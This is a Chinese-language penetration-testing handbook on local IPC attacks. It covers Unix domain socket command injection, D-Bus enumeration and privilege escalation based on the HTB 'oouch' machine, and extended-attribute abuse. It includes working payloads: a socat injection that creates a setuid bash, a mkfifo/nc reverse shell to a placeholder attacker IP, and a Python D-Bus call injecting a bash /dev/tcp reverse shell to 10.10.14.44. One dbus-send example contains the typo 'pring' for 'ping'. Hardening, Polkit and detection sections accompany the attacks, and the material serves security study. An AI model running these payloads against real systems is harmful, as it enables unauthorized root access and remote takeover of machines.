# 本地 IPC 通信安全渗透测试手册

> 本文档整合本地进程间通信（IPC）相关的安全漏洞利用技术，包括 Unix 域套接字命令注入、D-Bus 枚举与提权、扩展属性滥用等。

---

## 目录

1. [Unix 域套接字安全测试](#1-unix-域套接字安全测试)
2. [D-Bus 总线安全测试](#2-d-bus-总线安全测试)
3. [扩展属性（xattr）安全测试](#3-扩展属性xattr安全测试)

---

## 1. Unix 域套接字安全测试

### 1.1 套接字发现与枚举

Unix 域套接字（Unix Domain Socket）是本地进程间通信的重要机制，通常以文件形式存在于文件系统中。攻击者首先需要发现目标系统上存在的套接字。

#### 查找本地监听的 Unix 套接字

```bash
# 查找常见路径下的套接字文件
ls -la /var/run/*.sock /tmp/*.sock /run/*.sock 2>/dev/null

# 使用 ss 命令列出 Unix 域套接字（显示监听状态、进程信息）
ss -xlnp

# 使用 lsof 查找进程使用的套接字
lsof -U 2>/dev/null

# 使用 netstat 查看 Unix 域套接字
netstat -a -p --unix 2>/dev/null
```

#### 检查套接字权限

重点关注以下特征：
- **root 拥有的套接字**但允许其他用户写入（`chmod o+w`）
- **全局可写**的套接字文件
- 套接字所在目录的权限配置

---

### 1.2 Socket 命令注入漏洞

当服务在处理套接字输入时调用系统命令（如 `system()`、`popen()`），如果输入未经充分过滤，攻击者可以注入额外命令。

#### 常见场景

- 监控代理通过套接字接收命令
- 数据库服务本地连接
- 应用服务器管理接口
- 自定义守护进程的 IPC 通道

#### 注入原理

```bash
# 示例：如果服务处理文件名参数
# 正常输入: filename.txt
# 注入输入: filename.txt; id
# 注入输入: filename.txt$(id)
```

#### 利用示例（Python 套接字服务）

假设目标服务存在以下漏洞代码：

```python
import socket
import os

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
    server.listen(1)
    conn, addr = server.accept()
    datagram = conn.recv(1024)
    if datagram:
        os.system(datagram)  # 危险：直接执行接收到的数据
        conn.close()
```

**利用方式**：

```bash
# 通过 socat 连接并注入命令
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```

---

### 1.3 Root 特权套接字信号触发提权

某些特权守护进程暴露了 root 拥有的 UNIX 套接字，该套接字接受不受信任的输入，并将特权操作与线程 ID 和信号耦合。如果协议允许非特权客户端影响目标本地线程，可能触发特权代码路径。

#### 攻击模式

1. 连接到 root 拥有的套接字（例如 `/tmp/remotelogger`）
2. 创建一个线程并获取其本地线程 ID（TID）
3. 发送 TID（打包的）加填充作为请求；接收确认
4. 向该 TID 发送特定信号以触发特权行为

#### 最小 PoC 代码

```python
import socket, struct, os, threading, time

# 生成一个线程以便我们可以向其发送信号
th = threading.Thread(target=time.sleep, args=(600,))
th.start()
tid = th.native_id  # Python >= 3.8

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A' * 0x80)
s.recv(4)  # 同步
os.kill(tid, 4)  # 发送 SIGILL（示例）
```

#### 转化为 Root Shell

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```

#### 漏洞根源与加固

- **漏洞根源**：信任从非特权客户端状态派生的值（TID），并将其绑定到特权信号处理器或逻辑
- **加固措施**：
  - 在套接字上强制执行凭据验证
  - 验证消息格式
  - 将特权操作与外部提供的线程标识符解耦

---

## 2. D-Bus 总线安全测试

### 2.1 D-Bus 基础架构与枚举方法

D-Bus 在 Ubuntu 桌面环境中被用作进程间通信（IPC）中介。可以观察到多个消息总线的并发运行：
- **系统总线**：主要由特权服务用于暴露与系统相关的服务
- **会话总线**：每个登录用户的会话总线，仅暴露与该特定用户相关的服务

重点主要放在**系统总线**，因为它与以更高权限（例如 root）运行的服务相关，目标是提升权限。

D-Bus 的架构为每个会话总线采用了一个"路由器"，负责根据客户端指定的地址将客户端消息重定向到适当的服务。

D-Bus 上的服务由其暴露的**对象**和**接口**定义：
- **对象**：类比为标准面向对象语言中的类实例，每个实例由一个**对象路径**唯一标识（类似于文件系统路径）
- **接口**：定义对象支持的方法、信号和属性
- **关键接口**：`org.freedesktop.DBus.Introspectable`，具有 `Introspect` 方法，返回对象支持的方法、信号和属性的 XML 表示

---

#### 2.1.1 总线类型（系统总线 / 会话总线）

| 总线类型 | 用途 | 权限特征 |
|---------|------|---------|
| **系统总线** | 系统级服务通信 | 通常涉及 root 权限服务 |
| **会话总线** | 用户会话内应用通信 | 仅当前用户相关 |

检查会话总线地址：

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

---

#### 2.1.2 GUI 枚举工具（D-Feet）

D-Feet 是一个基于 Python 的 GUI 工具，旨在枚举每个总线上可用的服务并显示每个服务中包含的对象。

```bash
sudo apt-get install d-feet
```

**功能特点**：
- 显示在 D-Bus 系统总线中注册的服务
- 查询服务对象的对象、接口、方法、属性和信号
- 显示每个方法的签名
- 显示服务的**进程 ID（pid）**和**命令行**，用于确认服务是否以提升的权限运行
- **允许方法调用**：用户可以输入 Python 表达式作为参数，D-Feet 会将其转换为 D-Bus 类型后传递给服务

> **注意**：某些方法需要认证才能调用。如果目标是提升权限，应关注无需凭据即可调用的方法。

---

#### 2.1.3 命令行枚举（busctl、gdbus、dbus-send）

**列出 D-Bus 接口**：

```bash
busctl list
```

输出示例：

```
NAME                                   PID PROCESS         USER             CONNECTION    UNIT
:1.0                                     1 systemd         root             :1.0          init.scope
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service
org.freedesktop.DBus                     1 systemd         root             -             init.scope
```

标记为 **`(activatable)`** 的服务特别有趣，因为它们**尚未运行**，但总线请求可以按需启动它们。

**映射服务到可执行文件**：

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

---

#### 2.1.4 自动化枚举工具（dbusmap、uptux.py）

**dbusmap（"D-Bus 的 Nmap"）**

- 作者：@taviso – https://github.com/taviso/dbusmap
- 用 C 编写；单一静态二进制文件（< 50 kB）
- 遍历每个对象路径，提取 `Introspect` XML 并映射到拥有它的 PID/UID

```bash
# 列出系统总线上的每个服务并转储所有可调用方法
sudo dbus-map --dump-methods

# 主动探测可以在没有 Polkit 提示的情况下访问的方法/属性
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```

该工具用 `!` 标记未受保护的知名名称，即时显示可以**接管**的服务或从非特权 shell 可达的方法调用。

**uptux.py**

- 作者：@initstring – https://github.com/initstring/uptux
- 纯 Python 脚本，查找 systemd 单元中的**可写路径**和过于宽松的 D-Bus 策略文件

```bash
python3 uptux.py -n          # 运行所有检查但不写入日志文件
python3 uptux.py -d          # 启用详细调试输出
```

D-Bus 模块搜索以下目录：
- `/etc/dbus-1/system.d/`
- `/usr/share/dbus-1/system.d/`
- `/etc/dbus-1/system-local.d/`（供应商覆盖）

---

### 2.2 服务对象深度分析

#### 2.2.1 服务列表与唯一连接名称

当进程与总线建立连接时，总线会为该连接分配一个特殊的总线名称，称为**唯一连接名称**。这种名称以冒号字符开头，在连接存在期间不会改变，且在总线生命周期内不能被重用。

```bash
busctl list
```

---

#### 2.2.2 激活服务与可执行文件映射

将总线名称与其 systemd 单元和可执行文件路径关联：

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

这回答了权限提升过程中的关键问题：**如果方法调用成功，哪个真实的二进制文件和单元将执行该操作？**

---

#### 2.2.3 服务状态与权限信息（PID、UID、Capabilities）

获取服务对象的详细信息：

```bash
busctl status htb.oouch.Block
```

输出包含：
- PID、PPID、TTY、UID、EUID、SUID、FSUID
- GID、EGID、SGID、FSGID
- SupplementaryGIDs
- Comm、CommandLine、Label、CGroup
- Unit、Slice、UserUnit、UserSlice
- **EffectiveCapabilities**、**PermittedCapabilities**、**InheritableCapabilities**、**BoundingCapabilities**

---

#### 2.2.4 接口树与内省（Introspect）

**列出服务对象的接口树**：

```bash
busctl tree htb.oouch.Block
```

输出示例：

```
└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

**内省服务对象的接口**：

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block
```

输出示例：

```
NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

注意接口 `htb.oouch.Block` 的方法 `.Block`，签名中的 "s" 表示它期望一个字符串参数。

**低风险验证**：

在尝试任何危险操作之前，先验证一个**面向读取**的或其他低风险方法：

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

---

### 2.3 权限模型分析

#### 2.3.1 D-Bus XML 策略文件解析

D-Bus 策略文件定义了谁可以访问哪些服务。关键目录：

- `/etc/dbus-1/system.d/`
- `/usr/share/dbus-1/system.d/`
- `/etc/dbus-1/system-local.d/`

**分析策略文件**：

```bash
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
```

**示例策略文件**（htb.oouch.Block.conf）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
<busconfig>
    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>
    <policy user="www-data">
        <allow send_destination="htb.oouch.Block"/>
        <allow receive_sender="htb.oouch.Block"/>
    </policy>
</busconfig>
```

从配置中可见，**需要是用户 `root` 或 `www-data` 才能通过此 D-BUS 通信发送和接收信息**。

---

#### 2.3.2 Polkit 操作文件分析

Polkit（PolicyKit）用于确定是否应允许用户执行某些操作。分析 Polkit 操作文件：

```bash
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

关键授权级别：
- `allow_active`：活动会话中的授权
- `allow_inactive`：非活动会话中的授权
- `auth_admin`：需要管理员认证
- `auth_self`：需要自身认证
- `org.freedesktop.policykit.imply`：隐式授权

---

#### 2.3.3 三层关联分析

对于真正的权限提升分类，通常需要**一起检查三个层次**：

1. **激活元数据**（`.service` 文件或 `SystemdService=`）：了解将实际运行的二进制文件和单元
2. **D-Bus XML 策略**（`/etc/dbus-1/system.d/`、`/usr/share/dbus-1/system.d/`）：了解谁可以 `own`、`send_destination` 或 `receive_sender`
3. **Polkit 操作文件**（`/usr/share/polkit-1/actions/*.policy`）：了解默认授权模型

**关键命令**：

```bash
# 激活元数据
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null

# D-Bus XML 策略
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d 2>/dev/null

# Polkit 操作
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

> **重要**：不要假设 D-Bus 方法和 Polkit 操作之间存在 1:1 映射。同一个方法可能会根据被修改的对象或运行时上下文选择不同的操作。

**代理服务风险**：

一个**以 root 运行的代理**通过其自身预先建立的连接将请求转发到另一个 D-Bus 服务，如果原始调用者身份未被重新验证，可能会意外地使后端将每个请求视为来自 UID 0。

---

### 2.4 D-Bus 命令注入提权

#### 2.4.1 漏洞场景分析（HTB oouch 案例）

**漏洞背景**：

在 HTB 主机 "oouch" 中，作为用户 `qtc`，在 Docker 容器 `aeb4525789d8` 中，文件 `/code/oouch/routes.py` 包含以下关键代码：

```python
if primitive_xss.search(form.textfield.data):
    bus = dbus.SystemBus()
    block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
    block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

    client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
    response = block_iface.Block(client_ip)
    bus.close()
    return render_template('hacker.html', title='Hacker')
```

**漏洞分析**：

1. Web 应用连接到 D-Bus 系统总线的 `htb.oouch.Block` 服务
2. 将用户可控的 `client_ip` 传递给 `Block` 方法
3. 在 D-Bus 连接的另一端，C 编译的二进制代码通过 `system()` 函数调用 `iptables` 阻止给定 IP
4. **`system()` 调用存在命令注入漏洞**

**D-Bus 服务端 C 代码关键部分**（第 57 行）：

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

`method_block` 函数中：

```c
char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";
sprintf(command_buffer, command, host);
system(command_buffer);  // 危险：直接拼接用户输入到 system()
```

---

#### 2.4.2 Python 利用方法

```python
import dbus

bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

# 注入反向 shell 命令
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

**Payload 解析**：
- `;`：结束前一个 iptables 命令
- `bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1'`：执行反向 shell
- `#`：注释掉后续内容

---

#### 2.4.3 busctl / dbus-send 利用方法

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

参数说明：
- `--system`：使用系统消息总线（非会话总线）
- `--print-reply`：以人类可读格式打印回复
- `--dest=htb.oouch.Block`：D-Bus 接口地址（服务对象）
- `/htb/oouch/Block`：对象路径
- `htb.oouch.Block.Block`：方法调用（`htb.oouch.Block` 是服务对象，最后的 `.Block` 是方法名）
- `string:';pring -c 1 10.10.14.44 #'`：发送的消息类型和内容

> **注意**：`string:` 是发送消息的格式。也可以使用 `object path`（特殊文件/FIFO）以文件的名义将命令传递给接口。

---

#### 2.4.4 典型漏洞模式总结

D-Bus 命令注入提权的典型模式：

1. **服务以 root 身份在系统总线上运行**
2. **暴露的方法接受字符串参数**且未充分过滤
3. **方法内部调用 system()/popen()/exec()** 等函数执行系统命令
4. **D-Bus 策略允许非特权用户发送消息**到该服务
5. **没有 Polkit 认证**或认证配置错误

**攻击链**：

```
非特权用户 → D-Bus 系统总线 → root 服务 → system() → 命令注入 → 权限提升
```

---

### 2.5 D-Bus 通信监控与流量分析

#### 2.5.1 实时监控（busctl monitor / dbus-monitor）

需要 root 权限才能监控 D-Bus 通信。

```bash
# 监控指定接口
sudo busctl monitor htb.oouch.Block

# 系统级别监控（只能看到有权查看的消息）
sudo busctl monitor

# 使用 dbus-monitor
sudo dbus-monitor --system
```

**监控输出示例**：

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block
  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

---

#### 2.5.2 流量捕获（busctl capture / pcapng）

使用 `capture` 代替 `monitor` 将结果保存为 Wireshark 可以打开的 **pcapng** 文件：

```bash
# 捕获指定接口的流量
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng

# 捕获整个系统总线
sudo busctl capture > system-bus.pcapng
```

---

#### 2.5.3 过滤规则与降噪

如果总线上的信息太多，可以传递匹配规则：

```bash
# 监控特定信号
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"

# 指定多个规则（匹配任一规则即打印）
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"

# 仅监控方法调用、返回和错误
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

更多匹配规则语法参考：[D-Bus 文档](http://dbus.freedesktop.org/doc/dbus-specification.html)

---

### 2.6 已知漏洞案例（2024-2025）

#### 2.6.1 CVE-2024-45752（logiops 配置重配置）

| 项目 | 内容 |
|------|------|
| **组件** | `logiops` ≤ 0.3.4 (`logid`) |
| **根本原因** | 以 root 运行的服务暴露了非特权用户可以重新配置的 D-Bus 接口，包括加载攻击者控制的宏行为 |
| **攻击教训** | 如果守护进程在系统总线上暴露**设备/配置文件/配置管理**，将可写的配置和宏功能视为代码执行原语，而不仅仅是"设置" |

---

#### 2.6.2 CVE-2025-23222（Deepin dde-api-proxy 代理中继）

| 项目 | 内容 |
|------|------|
| **组件** | Deepin `dde-api-proxy` ≤ 1.0.19 |
| **根本原因** | 以 root 运行的兼容性代理在未保留原始调用者安全上下文的情况下将请求转发到后端服务，因此后端信任代理为 UID 0 |
| **攻击教训** | 将**代理/桥接/兼容性**D-Bus 服务视为一个单独的漏洞类别：如果它们中继特权调用，请验证调用者 UID/Polkit 上下文如何到达后端 |

---

#### 需要注意的模式

1. 服务**以 root 身份在系统总线上运行**
2. 要么**没有授权检查**，要么检查针对**错误的主题**执行
3. 可达的方法最终改变系统状态：包安装、用户/组更改、引导加载程序配置、设备配置文件更新、文件写入或直接命令执行

**验证流程**：

```bash
# 1. 枚举可调用方法
sudo dbus-map --enable-probes --null-agent --dump-methods

# 2. 检查策略和 Polkit
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=' /etc/dbus-1/system.d
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self' /usr/share/polkit-1/actions

# 3. 低风险探测
busctl call <service> <path> <interface> <method> <low-risk-args>
```

---

### 2.7 加固与检测方案

#### 加固措施

1. **搜索全局可写或开放策略**：

```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```

2. **对危险方法要求 Polkit**：即使是 root 代理也应将**调用者**PID 传递给 `polkit_authority_check_authorization_sync()`，而不是传递自己的

3. **放弃权限**：在长时间运行的辅助程序中使用 `sd_pid_get_owner_uid()` 在连接到总线后切换命名空间

4. **限定访问**：如果无法删除服务，至少将其限定到专用 Unix 组，并在其 XML 策略中限制访问

#### 检测方案

```bash
# 蓝队：捕获系统总线流量
busctl capture > /var/log/dbus_$(date +%F).pcapng

# 导入 Wireshark 进行异常检测
```

---

## 3. 扩展属性（xattr）安全测试

### 3.1 扩展属性基础与枚举

Linux 文件系统支持扩展属性（Extended Attributes，xattr），可以存储额外的元数据。某些安全机制使用扩展属性存储信息。

#### 查看文件扩展属性

```bash
# 查看所有扩展属性
getfattr -d -m ".*" /path/to/file

# 查看指定扩展属性
getfattr -n user.comment /path/to/file

# 列出扩展属性
attr -l /path/to/file

# ls 显示扩展属性标记（'+' 表示有扩展属性）
ls -l /path/to/file
```

#### 设置扩展属性

```bash
setfattr -n user.comment -v "value" /path/to/file
```

---

### 3.2 安全相关扩展属性（capabilities、SELinux）

| 扩展属性 | 用途 | 查看命令 |
|---------|------|---------|
| `security.capability` | 存储文件能力（capabilities） | `getfattr -n security.capability /usr/bin/ping` |
| `security.selinux` | 存储 SELinux 安全上下文 | `getfattr -n security.selinux /path/to/file` |
| `user.*` | 用户自定义元数据 | `getfattr -n user.comment /path/to/file` |

**文件能力示例**：

```bash
# 查看 ping 的能力（允许普通用户执行网络操作）
getfattr -n security.capability /usr/bin/ping

# 查看文件的 SELinux 上下文
getfattr -n security.selinux /etc/passwd
```

---

### 3.3 扩展属性滥用与绕过

#### 潜在风险

- **敏感信息泄露**：某些应用使用 `user.*` 命名空间存储敏感信息（如配置、密钥）
- **能力滥用**：通过修改 `security.capability` 可能获得额外权限（需要特权）
- **SELinux 绕过**：操纵 `security.selinux` 可能绕过强制访问控制（需要特权）
- **完整性检查绕过**：某些完整性检查工具可能忽略扩展属性，攻击者可利用此隐藏恶意数据

#### 检测与审计

```bash
# 查找具有扩展属性的文件
find / -exec ls -ld {} \; 2>/dev/null | grep '+'

# 批量查看关键目录的扩展属性
find /usr/bin -type f -exec getfattr -d -m ".*" {} \; 2>/dev/null

# 查看可疑的 user.* 扩展属性
find / -type f -exec getfattr -n user.* {} \; 2>/dev/null | head -100
```

---

## 参考资源

| 资源 | 链接 |
|------|------|
| D-Bus 权限提升（USBCreator） | https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/ |
| logiops CVE-2024-45752 | https://github.com/PixlOne/logiops/issues/473 |
| Deepin dde-api-proxy CVE-2025-23222 | https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html |
| dbusmap 工具 | https://github.com/taviso/dbusmap |
| uptux.py 工具 | https://github.com/initstring/uptux |
| D-Bus 监控配置 | https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/ |
| Ubuntu D-Bus 调试 | https://wiki.ubuntu.com/DebuggingDBus |
| D-Bus 规范文档 | http://dbus.freedesktop.org/doc/dbus-specification.html |
| busctl 手册 | https://www.freedesktop.org/software/systemd/man/busctl.html |
| LG WebOS TV 漏洞 | https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/ |
| Webdriver RCE | https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148 |
| CVE-2021-38112 | https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/ |
| Orange Tsai CTF | https://github.com/orangetw/My-CTF-Web-Challenges |
